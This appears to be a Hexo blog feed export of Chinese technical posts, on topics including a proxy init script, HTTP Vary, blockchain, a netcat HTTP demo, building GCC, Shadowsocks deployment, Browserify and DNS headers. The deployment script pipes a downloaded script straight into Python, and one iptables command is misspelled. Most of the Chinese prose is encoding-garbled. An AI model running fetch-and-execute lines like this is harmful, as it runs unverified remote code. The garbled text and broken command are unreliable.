class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">chkconfig: 345 90 90</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">description: ss server</span></span><br><span class="line"></span><br><span class="line">start() &#123;</span><br><span class="line">    echo -ne &quot;Starting ss server\n&quot;</span><br><span class="line">    # åå°è¿è¡Œ</span><br><span class="line">    /usr/local/bin/ss &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop() &#123;</span><br><span class="line">    echo -ne &quot;Stop ss server\n&quot;</span><br><span class="line">    # æ ¹æ®ç«¯å£å·æ€æ­»è¿›ç¨‹</span><br><span class="line">    fuser -k 1080/tcp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">restart() &#123;</span><br><span class="line">    stop</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status() &#123;</span><br><span class="line">    fuser 1080/tcp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">    start)</span><br><span class="line">        start</span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        stop</span><br><span class="line">        ;;</span><br><span class="line">    restart)</span><br><span class="line">        restart</span><br><span class="line">        ;;</span><br><span class="line">    status)</span><br><span class="line">        status</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        echo &#x27;Usage: service ss &#123;start|stop|restart|status&#125;&#x27;</span><br><span class="line">        ;;</span><br><span class="line">esac </span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://blog.fudenglong.site/2017/03/24/Linux%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/">Linuxè¿›ç¨‹å¯åŠ¨è„šæœ¬ç¼–å†™</a></li><li><a href="https://my.oschina.net/itblog/blog/532889">Linuxä¸‹ç¼–å†™è‡ªå·±çš„service</a></li><li><a href="http://blog.51cto.com/huanglianfeng/1363488">linux shellç¼–å†™ç³»ç»ŸæœåŠ¡è„šæœ¬</a></li><li><a href="https://www.cnblogs.com/panjun-Donet/archive/2010/08/10/1796873.html">Linuxä¸‹chkconfigå‘½ä»¤è¯¦è§£</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Http Vary</title>
      <link href="/post/http-vary.html"/>
      <url>/post/http-vary.html</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP-Vary"><a href="#HTTP-Vary" class="headerlink" title="HTTP Vary"></a>HTTP Vary</h1><p>å¥½å¤šæ—¶å€™æˆ‘ä»¬åœ¨å®¢æˆ·ç«¯å’Œç½‘ç«™é—´æœ‰ä¸€å±‚ç¼“å­˜å±‚ï¼Œå¦‚æœç¼“å­˜æˆåªæ˜¯æ ¹æ®<code>URL</code>æ¥æ¥ä½œä¸º<code>Key</code>ç¼“å­˜ä¼šå‡ºç°ä¸€äº›é—®é¢˜ã€‚è¿™ä¸»è¦æ˜¯HTTPå†…å®¹åå•†ï¼ˆContent Negotiationï¼‰ï¼ŒåŒä¸€ä¸ªURLçš„å¯¹åº”çš„å†…å®¹å¯èƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥è¿”å›gzipå‹ç¼©ç‰ˆæœ¬å’Œæœªå‹ç¼©ç‰ˆæœ¬ä¸¤ç§å†…å®¹ï¼Œè¿˜å¯ä»¥è¿”å›<code>JSON</code>ç±»å‹å’Œ<code>HTML</code>ç±»å‹ã€‚å¦‚æœæˆ‘ä»¬åªæ ¹æ®<code>URL</code>æ¥ç”Ÿæˆç¼“å­˜Keyè‚¯å®šæ˜¯æœ‰é—®é¢˜çš„ï¼Œä¾‹å¦‚å‰ä¸€ä¸ªè¯·æ±‚å®¢æˆ·ç«¯æ”¯æŒå‹ç¼©ç‰ˆæœ¬ï¼Œç¼“å­˜æˆå°±ä¼šç¼“å­˜ä¸‹æ¥ä¸€ä¸ªå‹ç¼©ç‰ˆæœ¬çš„å†…å®¹ï¼Œå¦‚æœåé¢ä¸€ä¸ªè¯·æ±‚å®¢æˆ·ç«¯ä¸æ”¯æŒgzipå‹ç¼©è¿™æ—¶å°±å‡ºé—®é¢˜äº†ã€‚è¦è§£å†³è¿™ç§é—®é¢˜ï¼Œæˆ‘å°±å°±è¦å‘Šè¯‰ç¼“å­˜æœåŠ¡å™¨é‡åˆ°åŒä¸€ä¸ª URL å¯¹åº”ç€ä¸åŒç‰ˆæœ¬æ–‡æ¡£çš„æƒ…å†µæ—¶ï¼Œå¦‚ä½•ç¼“å­˜å’Œç­›é€‰åˆé€‚çš„ç‰ˆæœ¬ã€‚</p><table><thead><tr><th>è¯·æ±‚å¤´å­—æ®µ</th><th>è¯´æ˜</th><th>å“åº”å¤´å­—æ®µ</th></tr></thead><tbody><tr><td>Accept</td><td>å‘ŠçŸ¥æœåŠ¡å™¨å‘é€ä½•ç§åª’ä½“ç±»å‹</td><td>Content-Type</td></tr><tr><td>Accept-Language</td><td>å‘ŠçŸ¥æœåŠ¡å™¨å‘é€ä½•ç§è¯­è¨€</td><td>Content-Language</td></tr><tr><td>Accept-Charset</td><td>å‘ŠçŸ¥æœåŠ¡å™¨å‘é€ä½•ç§å­—ç¬¦é›†</td><td>Content-Type</td></tr><tr><td>Accept-Encoding</td><td>å‘ŠçŸ¥æœåŠ¡å™¨é‡‡ç”¨ä½•ç§å‹ç¼©æ–¹å¼</td><td>Content-Encoding</td></tr></tbody></table><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p><a href="webp.html#%E4%BE%8B%E5%AD%90">WebP</a></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://imququ.com/post/vary-header-in-http.html">HTTP åè®®ä¸­ Vary çš„ä¸€äº›ç ”ç©¶</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary">Vary - HTTP | MDN</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cdn </tag>
            
            <tag> http </tag>
            
            <tag> cache </tag>
            
            <tag> vary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾</title>
      <link href="/post/blockchain.html"/>
      <url>/post/blockchain.html</url>
      
        <content type="html"><![CDATA[<h2 id="åŒºå—é“¾"><a href="#åŒºå—é“¾" class="headerlink" title="åŒºå—é“¾"></a>åŒºå—é“¾</h2><h3 id="åŒºå—é“¾æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#åŒºå—é“¾æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="åŒºå—é“¾æ˜¯ä»€ä¹ˆï¼Ÿ"></a>åŒºå—é“¾æ˜¯ä»€ä¹ˆï¼Ÿ</h3><blockquote><p>æœ‰å²ä»¥æ¥æœ€æ…¢çš„åˆ†å¸ƒå¼æ•°æ®åº“ã€‚</p></blockquote><p>åŒºå—é“¾æ˜¯ä¸€ç§åˆ†å¸ƒå¼æ•°æ®åº“æŠ€æœ¯ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¿æœ‰æ•´ä¸ªåŒºå—çš„å…¨éƒ¨æ•°æ®ã€‚åŒºå—é“¾æ˜¯æœ‰ä¸€ä¸ªä¸€ä¸ªçš„æ•°æ®å—é“¾æ¥è€Œæˆï¼Œæ¯ä¸ªæ•°æ®å—åˆ†ä¸ºå—å¤´ã€å—ä½“ä¸¤éƒ¨åˆ†ã€‚åŒºå—å¤´åŒ…å«<code>ç”Ÿæˆæ—¶é—´</code>ã€<code>åŒºå—ä½“çš„Hash</code>ã€<code>ä¸Šä¸€ä¸ªåŒºå—çš„Hash</code>ç­‰æ•°æ®ï¼ŒåŒºå—ä½“ç”¨äºè®°å½•æ•°æ®ã€‚</p><p>åŒºå—çš„<code>Hash</code>æœ‰åŒºå—å¤´è®¡ç®—è€Œæˆï¼ŒåŒºå—å¤´åŒ…å«å½“å‰å—çš„<code>Hash</code>å’Œä¸Šä¸€å—çš„<code>Hash</code>ã€‚</p><p>ç”±äºæ˜¯åˆ†å¸ƒå¼çš„ï¼Œå¿…é¡»ä¿è¯èŠ‚ç‚¹ä¹‹é—´çš„åŒæ­¥ï¼Œæ‰€ä»¥æ–°åŒºå—çš„æ·»åŠ é€Ÿåº¦ä¸èƒ½å¤ªå¿«ã€‚åŒºå—é“¾é“¾æŠ€æœ¯é™åˆ¶æ¯10åˆ†é’Ÿæ‰èƒ½ç”Ÿå­˜ä¸€ä¸ªæ–°åŒºå—ï¼ˆ2Mï¼‰ï¼Œè¿™ä¸»è¦é€šè¿‡æ§åˆ¶è®¡ç®—å—çš„<code>Hash</code>æ¥å®ç°ï¼Œè¿™ä¹Ÿæ˜¯ç°åœ¨åŒºå—é“¾æŠ€æœ¯ä¸»è¦çš„é—®é¢˜ï¼Œæ€§èƒ½å¤ªå·®ã€‚</p><p>åŒºå—ä½“ç”¨æ¥è®°å½•æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºæ•°æ®åº“ä¸­çš„<code>Page</code>ã€‚</p><h3 id="åŒºå—é“¾å’Œæ¯”ç‰¹å¸"><a href="#åŒºå—é“¾å’Œæ¯”ç‰¹å¸" class="headerlink" title="åŒºå—é“¾å’Œæ¯”ç‰¹å¸"></a>åŒºå—é“¾å’Œæ¯”ç‰¹å¸</h3><p>æ¯”ç‰¹å¸å°±æ˜¯ä¸€ä¸ªæ•°å­—ï¼ŒåŒºå—é“¾ä½œä¸ºä¸€ä¸ªæ•°æ®åº“è®°å½•ç”¨æˆ·çš„äº¤æ˜“ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯è®°å½•åœ¨åŒºå—ä½“ä¸­ï¼Œç°é˜¶æ®µæ¯ä¸ªåŒºå—ä½“æœ€å¤§<code>1M</code>ï¼Œæ¯ä¸ªåŒºå—ä½“å¯ä»¥è®°å½•å¾ˆå¤šæ¯”ç‰¹å¸äº¤æ˜“ä¿¡æ¯ã€‚</p><p><img src="/images/QQ20180130-181634@2x.jpg"><br><img src="/images/QQ20180130-181850@2x.jpg"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html">åŒºå—é“¾å…¥é—¨æ•™ç¨‹</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html">æ¯”ç‰¹å¸å…¥é—¨æ•™ç¨‹</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPåè®®</title>
      <link href="/post/http.html"/>
      <url>/post/http.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello, World."></a>Hello, World.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rm -rf index.html</span><br><span class="line">touch index.html</span><br><span class="line"></span><br><span class="line">body=&quot;&lt;h1&gt;Hello, World.&lt;/h1&gt;&quot;</span><br><span class="line"></span><br><span class="line">echo -e &quot;HTTP/1.1 200 OK\r\n&quot; &gt;&gt; index.html</span><br><span class="line">echo -e &quot;content-type: text/html; charset=utf-8\r\n&quot; &gt;&gt; index.html</span><br><span class="line">echo -e &quot;content-length: $&#123;#body&#125;\r\n&quot; &gt;&gt; index.html</span><br><span class="line">echo -e &quot;connection: close\r\n&quot; &gt;&gt; index.html</span><br><span class="line">echo -e &quot;\r\n&quot; &gt;&gt; index.html</span><br><span class="line"></span><br><span class="line">echo &quot;$&#123;body&#125;&quot; &gt;&gt; index.html</span><br><span class="line"></span><br><span class="line">sudo nc -l 80 &lt; index.html </span><br></pre></td></tr></table></figure><p>è®¿é—®<a href="http://127.0.0.1/">http://127.0.0.1</a></p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP&#x2F;1.1"></a>HTTP&#x2F;1.1</h3><h4 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h4><h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h4><h4 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h4><p><a href="/2017/11/13/chunked-transfer-encoding/">HTTP åˆ†å—ä¼ è¾“ç¼–ç </a></p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GCC</title>
      <link href="/post/install-gcc.html"/>
      <url>/post/install-gcc.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>ä¸‹è½½gccæœ€æ–°çš„æºç åŒ… <code>wget https://ftp.gnu.org/gnu/gcc/gcc-4.9.4/gcc-4.9.4.tar.gz</code>    </p></li><li><p>è§£å‹ç¼© <code>tar -zxvf gcc-4.9.4.tar.gz</code>    </p></li><li><p>cd gcc-4.9.4    </p></li><li><p>è¿è¡Œ<code>download_prerequisites</code>è„šæœ¬<code>./contrib/download_prerequisites</code> ã€‚è¿™ä¸ªè„šæœ¬ä¼šè‡ªåŠ¨å¸®ä½ ä¸‹è½½æ‰€éœ€è¦çš„ä¾èµ–æ–‡ä»¶å’Œåº“  </p></li><li><p>å»ºç«‹è¾“å‡ºç›®å½•ï¼Œå°†æ‰€æœ‰çš„ä¸­é—´æ–‡ä»¶éƒ½æ”¾åˆ°è¯¥ç›®å½•    </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir gcc_temp</span><br><span class="line">cd gcc_temp</span><br></pre></td></tr></table></figure></li><li><p>è¿è¡Œ <code>../configure --enable-checking=release --enable-languages=c,c++ --disable-multilib</code>    </p></li><li><p>make &amp; make install</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shadowsocks</title>
      <link href="/post/shadowsocks.html"/>
      <url>/post/shadowsocks.html</url>
      
        <content type="html"><![CDATA[<h2 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h2><p><img src="/images/whats-shadowsocks.png"></p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure><p><code>ssserver</code> &amp; <code>sslocal</code></p><h3 id="æœåŠ¡å™¨ç«¯"><a href="#æœåŠ¡å™¨ç«¯" class="headerlink" title="æœåŠ¡å™¨ç«¯"></a>æœåŠ¡å™¨ç«¯</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ss.json </span><br><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;: &quot;host&quot;,</span><br><span class="line">    &quot;server_port&quot;: 4443,</span><br><span class="line">    &quot;local_port&quot;: 1080,</span><br><span class="line">    &quot;password&quot;: &quot;password&quot;,</span><br><span class="line">    &quot;timeout&quot;: 600,</span><br><span class="line">    &quot;method&quot;: &quot;aes-256-cfb&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssserver -d start -c /etc/ss.json</span><br></pre></td></tr></table></figure><h3 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sslocal -d start -c /etc/ss.json </span><br><span class="line">-p port</span><br><span class="line">-s server</span><br><span class="line">-k pass</span><br><span class="line">-m encryption</span><br><span class="line">-h help</span><br></pre></td></tr></table></figure><h3 id="éƒ¨ç½²è„šæœ¬"><a href="#éƒ¨ç½²è„šæœ¬" class="headerlink" title="éƒ¨ç½²è„šæœ¬"></a>éƒ¨ç½²è„šæœ¬</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">install pip</span> </span><br><span class="line">curl -s &quot;https://bootstrap.pypa.io/get-pip.py&quot; | python</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">isntall shadowsocks</span></span><br><span class="line">pip install shadowsocks</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è·å–IP</span></span><br><span class="line">ip=`curl -s https://api.ipify.org`;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æœåŠ¡ç«¯å£</span></span><br><span class="line">port=4433</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯†ç </span></span><br><span class="line">pass=&quot;password&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¦‚æœæ— æ³•å¯åŠ¨å°è¯•ç»‘å®šæœåŠ¡å™¨IPä¸º0.0.0.0</span></span><br><span class="line">rm -rf /etc/ss.json </span><br><span class="line">touch /etc/ss.json </span><br><span class="line">echo -e &quot;&#123; \n \</span><br><span class="line">    \&quot;server\&quot;: \&quot;$ip\&quot;, \n \</span><br><span class="line">    \&quot;server_port\&quot;: $port, \n \</span><br><span class="line">    \&quot;local_port\&quot;: 1080, \n \</span><br><span class="line">    \&quot;password\&quot;: \&quot;$pass\&quot;, \n \</span><br><span class="line">    \&quot;timeout\&quot;: 600, \n \</span><br><span class="line">    \&quot;method\&quot;: \&quot;aes-256-cfb\&quot; \n \</span><br><span class="line">&#125;&quot; &gt; /etc/ss.json </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é˜²ç«å¢™</span></span><br><span class="line">iptables -I INPUT 1 -p tcp --dport 4433 -j ACCEPT</span><br><span class="line">iptables -I OUTPUT 1 -p tcp --sport 4433 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptable -I INPUT 5 -p icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line">service iptables save</span><br><span class="line">service iptables reload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨æœåŠ¡</span></span><br><span class="line">ssserver -d start -c /etc/ss.json</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://github.com/shadowsocks/shadowsocks/wiki">https://github.com/shadowsocks/shadowsocks/wiki</a><br><a href="https://shadowsocks.org/">https://shadowsocks.org/</a><br><a href="https://github.com/shadowsocks">https://github.com/shadowsocks</a><br><a href="https://github.com/shadowsocksr-backup">https://github.com/shadowsocksr-backup</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> shadowsocks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chromeä½¿ç”¨åŠé…ç½®</title>
      <link href="/post/chrome.html"/>
      <url>/post/chrome.html</url>
      
        <content type="html"><![CDATA[<h3 id="Chrome-ä½¿ç”¨åŠé…ç½®"><a href="#Chrome-ä½¿ç”¨åŠé…ç½®" class="headerlink" title="Chrome ä½¿ç”¨åŠé…ç½®"></a>Chrome ä½¿ç”¨åŠé…ç½®</h3><ol><li>ä½ æ˜¯ä¸æ˜¯è¦è®¿é—®<code>http://xn--flw351e/</code><br> <img src="/images/QQ20180105-103036@2x.jpg"><br> äº§ç”Ÿè¿™ä¸ªé—®é¢˜çš„ä¸»è¦åŸå› æ˜¯å› ä¸ºç”¨æˆ·DNSæŠŠè¾“å…¥ç»“æœè§£æäº†ï¼Œæœ‰äº›ç§æœ‰DNSä¼šä¸å­˜åœ¨çš„è§£æçš„è®°å½•è§£æåˆ°å…¬å¸ä¸»é¡µã€‚è§£å†³è¿™ä¸ªé—®é¢˜è¦ä¹ˆä½¿ç”¨å…¬å…±DNSï¼Œè¦ä¹ˆä¿®æ”¹ç§æœ‰DNSé…ç½®ã€‚</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Browserify</title>
      <link href="/post/browserify.html"/>
      <url>/post/browserify.html</url>
      
        <content type="html"><![CDATA[<h2 id="Browserify"><a href="#Browserify" class="headerlink" title="Browserify"></a>Browserify</h2><p><code>Browserify</code>å¯ä»¥ç¼–è¯‘<code>node</code>æ¨¡å—è®©å…¶åœ¨æµè§ˆå™¨ä¸­ä½¿ç”¨ã€‚</p><h3 id="Node-jså†…ç½®æ¨¡å—çš„è½¬æ¢"><a href="#Node-jså†…ç½®æ¨¡å—çš„è½¬æ¢" class="headerlink" title="Node.jså†…ç½®æ¨¡å—çš„è½¬æ¢"></a>Node.jså†…ç½®æ¨¡å—çš„è½¬æ¢</h3><p>ç†æƒ³æƒ…å†µä¸‹ï¼Œå¤§éƒ¨åˆ†ä¸æ¶‰åŠioæ“ä½œçš„æ¨¡å—å¯ä»¥åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è¿è¡Œã€‚</p><p>å¯¹äºnodejså†…ç½®æ¨¡å—ï¼Œåœ¨require()å®ƒä»¬çš„æ—¶å€™ï¼Œä¼šè¢«è½¬æ¢æˆå¦‚ä¸‹æ¨¡å—æ¥æ‰“åŒ…ï¼Œä»¥é€‚é…æµè§ˆå™¨ç¯å¢ƒã€‚</p><ul><li>assert</li><li>buffer</li><li>console</li><li>constants</li><li>crypto</li><li>domain</li><li>events</li><li>http</li><li>https</li><li>os</li><li>path</li><li>punycode</li><li>querystring</li><li>stream</li><li>string_decoder</li><li>timers</li><li>tty</li><li>url</li><li>util</li><li>vm</li><li>zlib</li></ul><p>å¦å¤–, å¦‚æœæ˜¯ç”¨åˆ°äº†å¦‚ä¸‹5ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒä»¬ä¼šåœ¨æ‰“åŒ…è¿‡ç¨‹ä¸­è¢«æ”¹å†™æˆå¯ä»¥é€‚é…æµè§ˆå™¨ç¯å¢ƒçš„ã€‚</p><ul><li>process</li><li>Buffer</li><li>global å…¨å±€å˜é‡window</li><li>__filename - æ–‡ä»¶å</li><li>__dirname - æ–‡ä»¶è·¯å¾„</li></ul><ol><li>ç¼–è¯‘ä»£ç </li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify ./math.js -o bundle.js</span><br></pre></td></tr></table></figure><ol start="2"><li>ç¼–è¯‘æˆrequireçš„å½¢å¼<blockquote><p>var math &#x3D; require(â€˜.&#x2F;math.jsâ€™);</p></blockquote></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify -r ./math.js -o bundle.js</span><br></pre></td></tr></table></figure><ol start="3"><li>ç¼–è¯‘æˆæ¨¡å—çš„å½¢å¼<blockquote><p>æµè§ˆå™¨é‡Œé¢ç›´æ¥è®¿é—®mathï¼Œnodeç¯å¢ƒé‡Œé¢å¯ä»¥require</p></blockquote></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify ./math.js -s math bundle.js</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://zhaoda.net/2015/10/16/browserify-guide/">http://zhaoda.net/2015/10/16/browserify-guide/</a></li><li><a href="https://www.ibm.com/developerworks/cn/web/1501_chengfu_browserify/">https://www.ibm.com/developerworks/cn/web/1501_chengfu_browserify/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> browserify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSåè®®</title>
      <link href="/post/dns.html"/>
      <url>/post/dns.html</url>
      
        <content type="html"><![CDATA[<h3 id="DNS-åè®®"><a href="#DNS-åè®®" class="headerlink" title="DNS åè®®"></a>DNS åè®®</h3><p><img src="/images/QQ20180108-121200@2x.jpg"></p><h4 id="å¤´ä¿¡æ¯"><a href="#å¤´ä¿¡æ¯" class="headerlink" title="å¤´ä¿¡æ¯"></a>å¤´ä¿¡æ¯</h4><p>DNSåè®®å¤´å…±12å­—èŠ‚ï¼Œåˆ†å…­å¤§éƒ¨åˆ†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                                1  1  1  1  1  1</span><br><span class="line">  0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                      ID                       |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                    QDCOUNT                    |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                    ANCOUNT                    |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                    NSCOUNT                    |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                    ARCOUNT                    |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€éƒ¨åˆ†2å­—èŠ‚(16ä½)ä¸º<code>Transaction Id</code>ï¼Œç”¨æ¥æ ‡è¯†å”¯ä¸€çš„æŸ¥è¯¢è¯·æ±‚ï¼ˆä¸»è¦åº”ä¸ºUDPåè®®ï¼‰ã€‚</li><li>ç¬¬äºŒéƒ¨åˆ†2å­—èŠ‚ä¸ºæ ‡å¿—ä½<code>Flags</code>ï¼Œå…±16ä½(bit)ã€‚<ul><li>QR(Request&#x2F;response)æ˜¯1ä½ï¼ˆbitï¼‰å­—æ®µï¼š0è¡¨ç¤ºæŸ¥è¯¢æŠ¥æ–‡ï¼Œ1è¡¨ç¤ºå“åº”æŠ¥æ–‡ã€‚</li><li>opcode æ˜¯ä¸€ä¸ª4ä½å­—æ®µï¼šé€šå¸¸å€¼ä¸º0ï¼ˆæ ‡å‡†æŸ¥è¯¢ï¼‰ï¼Œå…¶ä»–å€¼ä¸º1ï¼ˆåå‘æŸ¥è¯¢ï¼‰å’Œ2ï¼ˆæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚ï¼‰ã€‚</li><li>AA(Authoritative answer)æ˜¯1bitæ 